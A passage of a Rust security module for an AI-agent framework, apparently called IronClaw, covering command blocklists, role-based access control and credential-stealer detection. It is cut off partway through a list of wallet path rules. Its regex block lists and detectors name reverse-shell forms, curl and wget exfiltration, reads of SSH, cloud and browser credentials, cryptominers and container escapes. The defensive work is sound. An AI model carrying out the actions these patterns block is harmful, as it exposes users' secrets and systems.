//! Consolidated Security Module for IronClaw
//!
//! This module unifies all security subsystems into a single importable namespace:
//!
//! 1. **CommandGuardian** -- validates shell commands against 50+ blocked patterns
//! 2. **Policy (RBAC)** -- role-based access control with deny-first enforcement
//! 3. **AntiStealer** -- credential harvesting and exfiltration detection
//! 4. **SsrfGuard** -- server-side request forgery prevention
//! 5. **DlpEngine** -- data loss prevention scanning on all outputs
//! 6. **AuditLog** -- structured JSON-lines audit trail with PII redaction
//!
//! All subsystems are designed for Zero Trust: deny by default, validate everything,
//! log everything, and assume the LLM is adversarial.

use anyhow::Result;
use chrono::Utc;
use parking_lot::Mutex;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::io::Write;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::time::{Duration, Instant};
use tracing::{info, warn};

// Re-export key types used by the rest of the crate.
pub use self::audit::{AuditEntry, AuditLog, AuditSeverity, SiemEndpoint};
pub use self::command_guardian::CommandGuardian;
pub use self::dlp::{DataType, DlpAction, DlpEngine, DlpFinding, DlpResult, DlpRule};
pub use self::policy::{Policy, Role, ToolAccess};
pub use self::ssrf::{SsrfCheckResult, SsrfGuard};
pub use self::stealer::{
    AntiStealer, DetectionResult, Finding, SensitiveCategory, Severity,
};

// ---------------------------------------------------------------------------
// 1. Command Guardian
// ---------------------------------------------------------------------------
pub mod command_guardian {
    use super::*;
    use crate::core::config::GuardianConfig;
    use crate::core::types::RiskLevel;

    /// Patterns that are **always** blocked regardless of configuration.
    /// Covers destructive commands, privilege escalation, network exfiltration,
    /// reverse shells, system manipulation, cryptomining, container escape,
    /// credential access, history manipulation, and stealer patterns.
    const ALWAYS_BLOCKED: &[&str] = &[
        // -- Destructive filesystem commands (5) --
        r"(?i)\brm\s+(-[a-zA-Z]*r[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*|--recursive|--force)\s+/",
        r"(?i)\bmkfs(\.[a-z0-9]+)?\s",
        r"(?i)\bdd\s+.*of=/dev/",
        r"(?i)\bformat\s+[a-zA-Z]:",
        r"(?i)\bfdisk\s+/dev/",
        // -- More destructive commands (4) --
        r"(?i)\bshred\s+",
        r"(?i)\bwipefs\s+",
        r"(?i)\bparted\s+/dev/",
        r"(?i)\blvremove\s+",
        // -- Privilege escalation (6) --
        r"(?i)\bsudo\b",
        r"(?i)\bsu\s+-",
        r"(?i)\bchmod\s+[0-7]*777\b",
        r"(?i)\bchown\s+root\b",
        r"(?i)\bsetuid\b",
        r"(?i)\bchmod\s+[ug]\+s\b",
        // -- Network exfiltration (6) --
        r"(?i)\bcurl\s+.*(-d|--data|--data-binary|--data-urlencode)\b",
        r"(?i)\bwget\s+.*--post-data\b",
        r"(?i)\bnc\s+-[elp]",
        r"(?i)\bncat\b",
        r"(?i)\bsocat\b",
        r"(?i)\btcpdump\b",
        // -- Reverse shells (5) --
        r"(?i)/dev/tcp/",
        r"(?i)/dev/udp/",
        r"(?i)\bbash\s+-i\b",
        r"(?i)\bpython[23]?\s+-c\s+.*socket\b",
        r"(?i)\bperl\s+-e\s+.*socket\b",
        // -- System manipulation (9) --
        r"(?i)\bsysctl\s+-w\b",
        r"(?i)\biptables\b",
        r"(?i)\bnft\b",
        r"(?i)\bkill\s+-9\s+1\b",
        r"(?i)\bshutdown\b",
        r"(?i)\breboot\b",
        r"(?i)\bhalt\b",
        r"(?i)\binit\s+[06]\b",
        r"(?i)\bpoweroff\b",
        // -- Cryptomining (4) --
        r"(?i)\bxmrig\b",
        r"(?i)\bminerd\b",
        r"(?i)\bcpuminer\b",
        r"(?i)\bstratum\+tcp://",
        // -- Container escape (4) --
        r"(?i)\bdocker\s+.*--privileged\b",
        r"(?i)\bnsenter\b",
        r"(?i)mount\s+.*-o.*bind\b",
        r"(?i)\bdocker\s+run\s+.*-v\s+/:/",
        // -- Credential access (6) --
        r"(?i)\bcat\s+/etc/shadow\b",
        r"(?i)\bcat\s+.*\.ssh/\b",
        r"(?i)\bcat\s+.*\.env\b",
        r"(?i)\benv\s*$",
        r"(?i)\bprintenv\b",
        r"(?i)\bcat\s+/etc/master\.passwd\b",
        // -- History manipulation (3) --
        r"(?i)\bhistory\s+-c\b",
        r"(?i)\bunset\s+HISTFILE\b",
        r"(?i)export\s+HISTSIZE=0\b",
        // -- Stealer: credential file access (7) --
        r"(?i)\bcat\s+.*\.ssh/(id_rsa|id_ed25519|id_ecdsa|id_dsa)\b",
        r"(?i)\bcat\s+.*\.aws/credentials\b",
        r"(?i)\bcat\s+.*\.kube/config\b",
        r"(?i)\bcat\s+.*\.docker/config\.json\b",
        r"(?i)\bcat\s+.*\.gnupg/\b",
        r"(?i)\bcat\s+.*\.netrc\b",
        r"(?i)\bcat\s+.*\.npmrc\b",
        // -- Stealer: wallet access (2) --
        r"(?i)\bcat\s+.*(\.bitcoin|\.ethereum|\.solana|\.monero)/",
        r"(?i)\bcat\s+.*wallet\.(dat|json|key)\b",
        // -- Stealer: browser credential access (2) --
        r"(?i)\bcat\s+.*(Login\s*Data|cookies\.sqlite|Cookies|Web\s*Data)\b",
        r"(?i)\bsqlite3\s+.*(Login\s*Data|cookies|Web\s*Data)\b",
        // -- Stealer: keychain access (2) --
        r"(?i)\bsecurity\s+(find|dump|export)-(generic|internet)-password\b",
        r"(?i)\bcat\s+.*Keychains/\b",
        // -- Stealer: encoding for exfiltration (3) --
        r"(?i)\bbase64\s+.*\.(ssh|aws|pem|key|env)\b",
        r"(?i)\btar\s+.*\.(ssh|aws|gnupg|bitcoin|ethereum)\b",
        r"(?i)\bzip\s+.*\.(ssh|aws|gnupg|bitcoin|ethereum)\b",
        // -- Stealer: package registry credentials (2) --
        r"(?i)\bcat\s+.*\.(pypirc|cargo/credentials)\b",
        r"(?i)\bcat\s+.*\.cargo/credentials\.toml\b",
    ];

    /// Patterns that elevate risk classification but do not block.
    const HIGH_RISK_PATTERNS: &[&str] = &[
        r"(?i)\bgit\s+(push|force|reset|rebase)\b",
        r"(?i)\brm\s",
        r"(?i)\bmv\s",
        r"(?i)\bchmod\b",
        r"(?i)\bchown\b",
        r"(?i)\bcurl\b",
        r"(?i)\bwget\b",
        r"(?i)\bssh\b",
        r"(?i)\bscp\b",
        r"(?i)\bnpm\s+(install|i|add)\b",
        r"(?i)\bpip\s+install\b",
        r"(?i)\bcargo\s+install\b",
        r"(?i)\bapt\s+(install|remove)\b",
        r"(?i)\bbrew\s+(install|uninstall)\b",
    ];

    /// Shell operators that could be used for command injection.
    const SUBSHELL_OPERATORS: &[&str] = &["`", "$(", "${", "<(", ">("];

    /// Command Guardian -- validates all shell commands before execution.
    ///
    /// Defence-in-depth:
    /// 1. Blocklist matching (50+ compiled regex patterns)
    /// 2. Subshell / pipe / redirect blocking
    /// 3. Null byte and URL-encoded traversal detection
    /// 4. Risk classification (Low / Medium / High / Critical)
    pub struct CommandGuardian {
        blocked_patterns: Vec<Regex>,
        allowed_commands: Vec<String>,
        block_pipes: bool,
        block_redirects: bool,
        block_subshells: bool,
    }

    impl CommandGuardian {
        pub fn new(config: &GuardianConfig) -> Result<Self> {
            let mut blocked_patterns = Vec::with_capacity(
                ALWAYS_BLOCKED.len() + config.blocked_patterns.len(),
            );

            for pattern in ALWAYS_BLOCKED {
                blocked_patterns.push(Regex::new(pattern)?);
            }
            for pattern in &config.blocked_patterns {
                blocked_patterns.push(Regex::new(pattern)?);
            }

            info!(
                "Command Guardian initialized with {} blocked patterns",
                blocked_patterns.len()
            );

            Ok(Self {
                blocked_patterns,
                allowed_commands: config.allowed_commands.clone(),
                block_pipes: config.block_pipes,
                block_redirects: config.block_redirects,
                block_subshells: config.block_subshells,
            })
        }

        /// Validate a command. Returns `Ok(())` when allowed; error when blocked.
        pub fn validate_command(&self, command: &str) -> Result<()> {
            let command = command.trim();
            if command.is_empty() {
                anyhow::bail!("Empty command");
            }

            // Explicitly allowed commands bypass all checks.
            let base_cmd = command.split_whitespace().next().unwrap_or("");
            if self.allowed_commands.iter().any(|c| c == base_cmd) {
                return Ok(());
            }

            // Null byte injection (CWE-158)
            if command.contains('\0') {
                anyhow::bail!("Command contains null bytes (CWE-158)");
            }

            // Blocked pattern matching
            for pattern in &self.blocked_patterns {
                if pattern.is_match(command) {
                    warn!(
                        command = %Self::redact_command(command),
                        pattern = %pattern.as_str(),
                        "Command blocked by Guardian"
                    );
                    anyhow::bail!(
                        "Command blocked by security policy: matches blocked pattern"
                    );
                }
            }

            // Subshell operators
            if self.block_subshells {
                for op in SUBSHELL_OPERATORS {
                    if command.contains(op) {
                        anyhow::bail!(
                            "Command contains subshell operator '{}' which is blocked",
                            op
                        );
                    }
                }
            }

            // Pipe operator (allow || but block |)
            if self.block_pipes && command.contains('|') {
                let chars: Vec<char> = command.chars().collect();
                for (i, &c) in chars.iter().enumerate() {
                    if c == '|' {
                        let next = chars.get(i + 1).copied().unwrap_or(' ');
                        let prev = if i > 0 { chars[i - 1] } else { ' ' };
                        if next != '|' && prev != '|' {
                            anyhow::bail!("Pipe operator '|' is blocked by security policy");
                        }
                    }
                }
            }

            // Output redirection
            if self.block_redirects {
                let re = Regex::new(r"[^-]>\s*[/~.]")?;
                if re.is_match(command) {
                    anyhow::bail!("Output redirection is blocked by security policy");
                }
            }

            // URL-encoded path traversal (CWE-22)
            if command.contains("%2e%2e")
                || command.contains("%2E%2E")
                || command.contains("%2f")
                || command.contains("%2F")
                || command.contains("%252e")
            {
                anyhow::bail!("URL-encoded path traversal detected (CWE-22)");
            }

            Ok(())
        }

        /// Classify the risk level of a (non-blocked) command.
        pub fn classify_risk(&self, command: &str) -> RiskLevel {
            for pattern in HIGH_RISK_PATTERNS {
                if let Ok(re) = Regex::new(pattern) {
                    if re.is_match(command) {
                        return RiskLevel::High;
                    }
                }
            }

            let state_words = [
                "write", "create", "delete", "update", "set", "put", "post",
            ];
            let lower = command.to_lowercase();
            for kw in &state_words {
                if lower.contains(kw) {
                    return RiskLevel::Medium;
                }
            }

            RiskLevel::Low
        }

        /// Number of compiled blocked patterns (for diagnostics / doctor).
        pub fn blocked_count(&self) -> usize {
            self.blocked_patterns.len()
        }

        /// Redact secrets from a command string before logging.
        pub fn redact_command(command: &str) -> String {
            let patterns: &[(&str, &str)] = &[
                (
                    r"(?i)(token|key|password|secret|credential)\s*=\s*\S+",
                    "$1=***REDACTED***",
                ),
                (r"(?i)bearer\s+\S+", "Bearer ***REDACTED***"),
                (r"(?i)(Authorization:\s*)\S+", "$1***REDACTED***"),
            ];
            let mut result = command.to_string();
            for &(pat, rep) in patterns {
                if let Ok(re) = Regex::new(pat) {
                    result = re.replace_all(&result, rep).to_string();
                }
            }
            result
        }
    }
}

// ---------------------------------------------------------------------------
// 2. RBAC Policy
// ---------------------------------------------------------------------------
pub mod policy {
    use super::*;
    use crate::core::config::PermissionsConfig;
    use crate::core::types::SecurityContext;

    // --- Custom glob matching (no external glob crate) ---
    mod glob {
        #[derive(Debug, Clone)]
        pub struct Pattern {
            pattern: String,
        }

        impl Pattern {
            pub fn new(pattern: &str) -> Result<Self, String> {
                Ok(Self {
                    pattern: pattern.to_string(),
                })
            }

            pub fn matches(&self, path: &str) -> bool {
                Self::glob_match(&self.pattern, path)
            }

            fn glob_match(pattern: &str, text: &str) -> bool {
                let p: Vec<char> = pattern.chars().collect();
                let t: Vec<char> = text.chars().collect();
                Self::match_impl(&p, &t, 0, 0)
            }

            fn match_impl(p: &[char], t: &[char], pi: usize, ti: usize) -> bool {
                if pi == p.len() && ti == t.len() {
                    return true;
                }
                if pi == p.len() {
                    return false;
                }
                // ** matches everything including /
                if p[pi] == '*' && pi + 1 < p.len() && p[pi + 1] == '*' {
                    let next_pi = if pi + 2 < p.len() && p[pi + 2] == '/' {
                        pi + 3
                    } else {
                        pi + 2
                    };
                    for i in ti..=t.len() {
                        if Self::match_impl(p, t, next_pi, i) {
                            return true;
                        }
                    }
                    return false;
                }
                // * matches everything except /
                if p[pi] == '*' {
                    for i in ti..=t.len() {
                        if i > ti && ti < t.len() && t[i - 1] == '/' {
                            break;
                        }
                        if Self::match_impl(p, t, pi + 1, i) {
                            return true;
                        }
                    }
                    return false;
                }
                if ti < t.len() && (p[pi] == '?' || p[pi] == t[ti]) {
                    return Self::match_impl(p, t, pi + 1, ti + 1);
                }
                false
            }
        }
    }

    #[derive(Debug, Clone, Serialize, Deserialize)]
    pub struct Role {
        pub name: String,
        pub permissions: HashSet<String>,
        pub deny: HashSet<String>,
    }

    #[derive(Debug, Clone)]
    pub struct ToolAccess {
        pub tool_name: String,
        pub enabled: bool,
        pub require_approval: bool,
        pub rate_limit: Option<RateLimitState>,
        pub required_permissions: HashSet<String>,
    }

    #[derive(Debug, Clone)]
    pub struct RateLimitState {
        pub max_per_hour: u32,
        pub current_count: std::sync::Arc<std::sync::atomic::AtomicU32>,
        pub window_start: std::sync::Arc<Mutex<Instant>>,
    }

    #[derive(Debug, Clone)]
    struct FilesystemPolicy {
        read_allow: Vec<glob::Pattern>,
        write_allow: Vec<glob::Pattern>,
        deny: Vec<glob::Pattern>,
    }

    #[derive(Debug, Clone)]
    struct NetworkPolicy {
        allow_domains: HashSet<String>,
        block_domains: HashSet<String>,
        #[allow(dead_code)]
        allow_private: bool,
        #[allow(dead_code)]
        max_requests_per_hour: u32,
    }

    #[derive(Debug, Clone)]
    struct SystemPolicy {
        allow_shell: bool,
        #[allow(dead_code)]
        require_approval_high_risk: bool,
        #[allow(dead_code)]
        max_concurrent: usize,
    }

    /// RBAC Policy engine with deny-first enforcement.
    pub struct Policy {
        roles: HashMap<String, Role>,
        tool_permissions: HashMap<String, ToolAccess>,
        fs_policy: FilesystemPolicy,
        net_policy: NetworkPolicy,
        sys_policy: SystemPolicy,
    }

    impl Policy {
        /// Build a policy from the configuration.
        pub fn from_config(config: &PermissionsConfig) -> Result<Self> {
            let fs_policy = Self::build_fs_policy(&config.filesystem)?;
            let net_policy = Self::build_net_policy(&config.network);
            let sys_policy = Self::build_sys_policy(&config.system);
            let tool_permissions = Self::build_tool_permissions(&config.tools);

            // Default roles
            let mut roles = HashMap::new();

            roles.insert(
                "readonly".to_string(),
                Role {
                    name: "readonly".to_string(),
                    permissions: ["fs.read", "memory.read"]
                        .iter()
                        .map(|s| s.to_string())
                        .collect(),
                    deny: HashSet::new(),
                },
            );

            roles.insert(
                "agent".to_string(),
                Role {
                    name: "agent".to_string(),
                    permissions: [
                        "fs.read",
                        "fs.write",
                        "memory.read",
                        "memory.write",
                        "tool.execute",
                        "net.outbound",
                    ]
                    .iter()
                    .map(|s| s.to_string())
                    .collect(),
                    deny: ["sys.admin", "sys.privileged"]
                        .iter()
                        .map(|s| s.to_string())
                        .collect(),
                },
            );

            roles.insert(
                "admin".to_string(),
                Role {
                    name: "admin".to_string(),
                    permissions: [
                        "fs.read",
                        "fs.write",
                        "memory.read",
                        "memory.write",
                        "tool.execute",
                        "net.outbound",
                        "sys.shell",
                        "sys.admin",
                    ]
                    .iter()
                    .map(|s| s.to_string())
                    .collect(),
                    deny: HashSet::new(),
                },
            );

            info!("RBAC policy loaded with {} roles", roles.len());

            Ok(Self {
                roles,
                tool_permissions,
                fs_policy,
                net_policy,
                sys_policy,
            })
        }

        // ---- builders ----

        fn build_fs_policy(
            config: &crate::core::config::FilesystemPermissions,
        ) -> Result<FilesystemPolicy> {
            let read_allow = config
                .read
                .iter()
                .map(|p| glob::Pattern::new(p))
                .collect::<Result<Vec<_>, _>>()
                .map_err(|e| anyhow::anyhow!("Invalid glob: {}", e))?;
            let write_allow = config
                .write
                .iter()
                .map(|p| glob::Pattern::new(p))
                .collect::<Result<Vec<_>, _>>()
                .map_err(|e| anyhow::anyhow!("Invalid glob: {}", e))?;
            let deny = config
                .deny
                .iter()
                .map(|p| glob::Pattern::new(p))
                .collect::<Result<Vec<_>, _>>()
                .map_err(|e| anyhow::anyhow!("Invalid glob: {}", e))?;
            Ok(FilesystemPolicy {
                read_allow,
                write_allow,
                deny,
            })
        }

        fn build_net_policy(config: &crate::core::config::NetworkPermissions) -> NetworkPolicy {
            NetworkPolicy {
                allow_domains: config.allow_domains.iter().cloned().collect(),
                block_domains: config.block_domains.iter().cloned().collect(),
                allow_private: !config.block_private,
                max_requests_per_hour: config.max_requests_per_hour,
            }
        }

        fn build_sys_policy(config: &crate::core::config::SystemPermissions) -> SystemPolicy {
            SystemPolicy {
                allow_shell: config.allow_shell,
                require_approval_high_risk: config.require_approval,
                max_concurrent: config.max_concurrent,
            }
        }

        fn build_tool_permissions(
            config: &HashMap<String, crate::core::config::ToolPermissions>,
        ) -> HashMap<String, ToolAccess> {
            config
                .iter()
                .map(|(name, perms)| {
                    (
                        name.clone(),
                        ToolAccess {
                            tool_name: name.clone(),
                            enabled: perms.enabled,
                            require_approval: perms.require_approval,
                            rate_limit: perms.rate_limit.map(|max| RateLimitState {
                                max_per_hour: max,
                                current_count: std::sync::Arc::new(
                                    std::sync::atomic::AtomicU32::new(0),
                                ),
                                window_start: std::sync::Arc::new(Mutex::new(Instant::now())),
                            }),
                            required_permissions: HashSet::new(),
                        },
                    )
                })
                .collect()
        }

        // ---- public checks ----

        /// Check whether a tool may be invoked under the given security context.
        pub fn check_tool_access(&self, tool_name: &str, ctx: &SecurityContext) -> Result<()> {
            // Disabled tool?
            if let Some(access) = self.tool_permissions.get(tool_name) {
                if !access.enabled {
                    anyhow::bail!("Tool '{}' is disabled by policy", tool_name);
                }
                // Sliding-window rate limit
                if let Some(rl) = &access.rate_limit {
                    let mut ws = rl.window_start.lock();
                    let now = Instant::now();
                    if now.duration_since(*ws) > Duration::from_secs(3600) {
                        *ws = now;
                        rl.current_count
                            .store(0, std::sync::atomic::Ordering::Relaxed);
                    }
                    let count = rl
                        .current_count
                        .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    if count >= rl.max_per_hour {
                        anyhow::bail!(
                            "Tool '{}' rate limit exceeded ({}/hour)",
                            tool_name,
                            rl.max_per_hour
                        );
                    }
                }
            }

            // Role-based checks -- deny always wins
            if let Some(role) = self.roles.get(&ctx.role) {
                for denied in &role.deny {
                    if tool_name.starts_with(denied) {
                        warn!(tool = %tool_name, role = %ctx.role, "Denied by role deny list");
                        anyhow::bail!(
                            "Tool '{}' is denied for role '{}'",
                            tool_name,
                            ctx.role
                        );
                    }
                }
                if !role.permissions.contains("tool.execute") {
                    anyhow::bail!(
                        "Role '{}' lacks tool.execute permission",
                        ctx.role
                    );
                }
            }

            // Shell-specific check
            if (tool_name == "shell" || tool_name == "execute") && !self.sys_policy.allow_shell {
                anyhow::bail!("Shell execution is disabled by system policy");
            }

            Ok(())
        }

        /// Check whether a filesystem path may be read.
        pub fn check_fs_read(&self, path: &str) -> Result<()> {
            for dp in &self.fs_policy.deny {
                if dp.matches(path) {
                    anyhow::bail!("Path '{}' is denied by filesystem policy", path);
                }
            }
            if self.fs_policy.read_allow.is_empty() {
                return Ok(());
            }
            for ap in &self.fs_policy.read_allow {
                if ap.matches(path) {
                    return Ok(());
                }
            }
            anyhow::bail!("Path '{}' is not in filesystem read allow list", path)
        }

        /// Check whether a filesystem path may be written.
        pub fn check_fs_write(&self, path: &str) -> Result<()> {
            for dp in &self.fs_policy.deny {
                if dp.matches(path) {
                    anyhow::bail!("Path '{}' is denied by filesystem policy", path);
                }
            }
            if self.fs_policy.write_allow.is_empty() {
                anyhow::bail!("No write paths configured -- all writes denied by default");
            }
            for ap in &self.fs_policy.write_allow {
                if ap.matches(path) {
                    return Ok(());
                }
            }
            anyhow::bail!("Path '{}' is not in filesystem write allow list", path)
        }

        /// Check whether outbound access to a domain is permitted.
        pub fn check_network_access(&self, domain: &str) -> Result<()> {
            if self.net_policy.block_domains.contains(domain) {
                anyhow::bail!("Domain '{}' is blocked by network policy", domain);
            }
            if self.net_policy.allow_domains.is_empty() {
                return Ok(());
            }
            for allowed in &self.net_policy.allow_domains {
                if allowed.starts_with("*.") {
                    let suffix = &allowed[2..];
                    if domain.ends_with(suffix) {
                        return Ok(());
                    }
                } else if allowed == domain {
                    return Ok(());
                }
            }
            anyhow::bail!("Domain '{}' is not in network allow list", domain)
        }

        /// Number of per-tool permission entries.
        pub fn tool_count(&self) -> usize {
            self.tool_permissions.len()
        }
    }
}

// ---------------------------------------------------------------------------
// 3. Anti-Stealer Detection
// ---------------------------------------------------------------------------
pub mod stealer {
    use super::*;

    #[derive(Debug, Clone, PartialEq, Eq)]
    pub enum SensitiveCategory {
        SshKeys,
        CloudCredentials,
        CryptoWallets,
        BrowserProfiles,
        PasswordStores,
        CertificatesKeys,
        EnvironmentFiles,
        SystemCredentials,
        DatabaseCredentials,
        ApiTokens,
    }

    #[derive(Debug, Clone, PartialEq, Eq)]
    pub enum Severity {
        Critical,
        High,
        Medium,
        Low,
    }

    #[derive(Debug, Clone)]
    pub struct SensitivePathRule {
        pub pattern: Regex,
        pub category: SensitiveCategory,
        pub severity: Severity,
        pub description: String,
    }

    #[derive(Debug, Clone)]
    pub struct CredentialPattern {
        pub pattern: Regex,
        pub credential_type: String,
        pub severity: Severity,
    }

    #[derive(Debug)]
    struct AccessTracker {
        sensitive_reads: Vec<SensitiveAccess>,
        #[allow(dead_code)]
        file_accesses: HashMap<String, Vec<Instant>>,
        blocked_count: u64,
        correlation_window: Duration,
    }

    #[derive(Debug, Clone)]
    struct SensitiveAccess {
        #[allow(dead_code)]
        path: String,
        category: SensitiveCategory,
        timestamp: Instant,
        session_id: String,
    }

    #[derive(Debug, Clone)]
    pub struct DetectionResult {
        pub blocked: bool,
        pub findings: Vec<Finding>,
    }

    #[derive(Debug, Clone)]
    pub struct Finding {
        pub rule: String,
        pub severity: Severity,
        pub description: String,
        pub category: String,
    }

    /// Anti-Stealer module -- detects credential harvesting, data exfiltration,
    /// and stealer-like behaviour patterns.
    pub struct AntiStealer {
        sensitive_paths: Vec<SensitivePathRule>,
        credential_patterns: Vec<CredentialPattern>,
        access_tracker: Mutex<AccessTracker>,
        enforce: bool,
    }

    impl AntiStealer {
        pub fn new(enforce: bool) -> Result<Self> {
            let sensitive_paths = Self::build_sensitive_path_rules()?;
            let credential_patterns = Self::build_credential_patterns()?;

            info!(
                paths = sensitive_paths.len(),
                credentials = credential_patterns.len(),
                enforce = enforce,
                "Anti-Stealer module initialized"
            );

            Ok(Self {
                sensitive_paths,
                credential_patterns,
                access_tracker: Mutex::new(AccessTracker {
                    sensitive_reads: Vec::new(),
                    file_accesses: HashMap::new(),
                    blocked_count: 0,
                    correlation_window: Duration::from_secs(300),
                }),
                enforce,
            })
        }

        /// Check whether accessing `path` should be blocked.
        pub fn check_file_access(&self, path: &str, session_id: &str) -> DetectionResult {
            let mut findings = Vec::new();
            let normalized = Self::normalize_path(path);

            for rule in &self.sensitive_paths {
                if rule.pattern.is_match(&normalized) {
                    findings.push(Finding {
                        rule: format!("sensitive-path:{:?}", rule.category),
                        severity: rule.severity.clone(),
                        description: format!(
                            "Access to sensitive path: {} ({})",
                            path, rule.description
                        ),
                        category: format!("{:?}", rule.category),
                    });

                    let mut tracker = self.access_tracker.lock();
                    tracker.sensitive_reads.push(SensitiveAccess {
                        path: normalized.clone(),
                        category: rule.category.clone(),
                        timestamp: Instant::now(),
                        session_id: session_id.to_string(),
                    });
                }
            }

            let blocked = self.enforce
                && findings
                    .iter()
                    .any(|f| matches!(f.severity, Severity::Critical | Severity::High));

            if blocked {
                self.access_tracker.lock().blocked_count += 1;
                warn!(path = %path, "Anti-Stealer: blocked sensitive file access");
            }

            DetectionResult { blocked, findings }
        }

        /// Scan arbitrary content for credential patterns.
        pub fn scan_content(&self, content: &str) -> Vec<Finding> {
            let mut findings = Vec::new();
            for pat in &self.credential_patterns {
                if pat.pattern.is_match(content) {
                    findings.push(Finding {
                        rule: format!("credential-content:{}", pat.credential_type),
                        severity: pat.severity.clone(),
                        description: format!(
                            "Credential-like content detected: {}",
                            pat.credential_type
                        ),
                        category: "credential_content".to_string(),
                    });
                }
            }
            findings
        }

        /// Check a shell command for stealer-like patterns.
        pub fn check_command(&self, command: &str) -> DetectionResult {
            let mut findings = Vec::new();
            let cmd_lower = command.to_lowercase();

            let stealer_patterns: &[(&str, &str, Severity)] = &[
                (
                    r"(?i)cat\s+.*\.(pem|key|p12|pfx|jks)\b",
                    "Certificate/key file access via cat",
                    Severity::Critical,
                ),
                (
                    r"(?i)(curl|wget|nc)\s+.*<\s*/",
                    "Network tool reading from filesystem",
                    Severity::Critical,
                ),
                (
                    r"(?i)base64\s+.*\.(ssh|aws|pem|key|env)\b",
                    "Base64 encoding of sensitive file",
                    Severity::Critical,
                ),
                (
                    r"(?i)tar\s+.*\.(ssh|aws|gnupg|config)\b",
                    "Archiving sensitive directories",
                    Severity::High,
                ),
                (
                    r"(?i)(curl|wget)\s+.*-d\s+.*@.*\.(env|key|pem|credentials)\b",
                    "Uploading sensitive file via HTTP",
                    Severity::Critical,
                ),
                (
                    r#"(?i)find\s+.*-name\s+['"?]*\*\.(pem|key|p12|env)\b"#,
                    "Searching for credential files",
                    Severity::High,
                ),
                (
                    r"(?i)grep\s+-r.*(password|secret|token|api.key)\b",
                    "Recursive search for credentials",
                    Severity::High,
                ),
                (
                    r"(?i)(python|ruby|perl|node).*-e.*socket|http|request\b",
                    "Inline script with network capability",
                    Severity::High,
                ),
                (
                    r"(?i)(gpg|openssl)\s+(--export|enc|s_client)\b",
                    "Cryptographic tool usage for export/encrypt",
                    Severity::Medium,
                ),
                (
                    r"(?i)zip\s+-.*\.(ssh|aws|gnupg|wallet)\b",
                    "Compressing sensitive directories",
                    Severity::High,
                ),
            ];

            for &(pattern, description, ref severity) in stealer_patterns {
                if let Ok(re) = Regex::new(pattern) {
                    if re.is_match(command) {
                        findings.push(Finding {
                            rule: "stealer-command".to_string(),
                            severity: severity.clone(),
                            description: description.to_string(),
                            category: "command_stealer".to_string(),
                        });
                    }
                }
            }

            // Multi-step: read | encode | send
            if (cmd_lower.contains("cat ") || cmd_lower.contains("read"))
                && (cmd_lower.contains("base64")
                    || cmd_lower.contains("xxd")
                    || cmd_lower.contains("od "))
                && (cmd_lower.contains("curl")
                    || cmd_lower.contains("wget")
                    || cmd_lower.contains("nc "))
            {
                findings.push(Finding {
                    rule: "multi-step-exfiltration".to_string(),
                    severity: Severity::Critical,
                    description:
                        "Multi-step exfiltration pattern: read -> encode -> send".to_string(),
                    category: "exfiltration".to_string(),
                });
            }

            let blocked = self.enforce
                && findings
                    .iter()
                    .any(|f| matches!(f.severity, Severity::Critical | Severity::High));

            DetectionResult { blocked, findings }
        }

        /// Detect read-then-send correlation across tool calls in the same session.
        pub fn check_exfiltration_correlation(
            &self,
            network_domain: &str,
            session_id: &str,
        ) -> DetectionResult {
            let mut findings = Vec::new();
            let tracker = self.access_tracker.lock();
            let now = Instant::now();

            let recent: Vec<&SensitiveAccess> = tracker
                .sensitive_reads
                .iter()
                .filter(|a| {
                    a.session_id == session_id
                        && now.duration_since(a.timestamp) < tracker.correlation_window
                })
                .collect();

            if !recent.is_empty() {
                let cats: Vec<String> =
                    recent.iter().map(|a| format!("{:?}", a.category)).collect();
                findings.push(Finding {
                    rule: "exfiltration-correlation".to_string(),
                    severity: Severity::Critical,
                    description: format!(
                        "Network request to {} after reading sensitive files ({})",
                        network_domain,
                        cats.join(", ")
                    ),
                    category: "exfiltration".to_string(),
                });
            }

            let blocked = self.enforce && !findings.is_empty();
            DetectionResult { blocked, findings }
        }

        pub fn blocked_count(&self) -> u64 {
            self.access_tracker.lock().blocked_count
        }

        pub fn cleanup_expired(&self) {
            let mut tracker = self.access_tracker.lock();
            let now = Instant::now();
            let window = tracker.correlation_window;
            tracker
                .sensitive_reads
                .retain(|a| now.duration_since(a.timestamp) < window);
        }

        // ---- internal builders ----

        fn normalize_path(path: &str) -> String {
            let expanded = if path.starts_with("~/") {
                if let Ok(home) = std::env::var("HOME") {
                    path.replacen("~", &home, 1)
                } else {
                    path.to_string()
                }
            } else {
                path.to_string()
            };
            expanded.replace("/./", "/").to_lowercase()
        }

        fn build_sensitive_path_rules() -> Result<Vec<SensitivePathRule>> {
            let rules: Vec<(&str, SensitiveCategory, Severity, &str)> = vec![
                // SSH (2)
                (r"(?i)(^|/)\.ssh/(id_rsa|id_ed25519|id_ecdsa|id_dsa|authorized_keys|known_hosts|config)$",
                 SensitiveCategory::SshKeys, Severity::Critical, "SSH key or config"),
                (r"(?i)(^|/)\.ssh/", SensitiveCategory::SshKeys, Severity::High, "SSH directory"),
                // Cloud (6)
                (r"(?i)(^|/)\.aws/(credentials|config)$",
                 SensitiveCategory::CloudCredentials, Severity::Critical, "AWS credentials"),
                (r"(?i)(^|/)\.azure/(accessTokens|azureProfile)\.json$",
                 SensitiveCategory::CloudCredentials, Severity::Critical, "Azure credentials"),
                (r"(?i)(^|/)\.config/gcloud/(credentials\.db|application_default_credentials\.json)$",
                 SensitiveCategory::CloudCredentials, Severity::Critical, "GCP credentials"),
                (r"(?i)(^|/)\.kube/config$",
                 SensitiveCategory::CloudCredentials, Severity::Critical, "Kubernetes config"),
                (r"(?i)(^|/)\.docker/config\.json$",
                 SensitiveCategory::CloudCredentials, Severity::High, "Docker registry creds"),
                (r"(?i)(^|/)\.terraform\.d/credentials\.tfrc\.json$",
                 SensitiveCategory::CloudCredentials, Severity::Critical, "Terraform credentials"),
                // Crypto wallets (4)
                (r"(?i)(^|/)(\.bitcoin|\.ethereum|\.solana|\.monero)/",
                 SensitiveCategory::CryptoWallets, Severity::Critical, "Crypto wallet dir"),
                (r"(?i)(^|/)wallet\.(dat|json|key)$",
                 SensitiveCategory::CryptoWallets, Severity::Critical, "Wallet file"),
                (r"(?i)(^|/)\.electrum/",
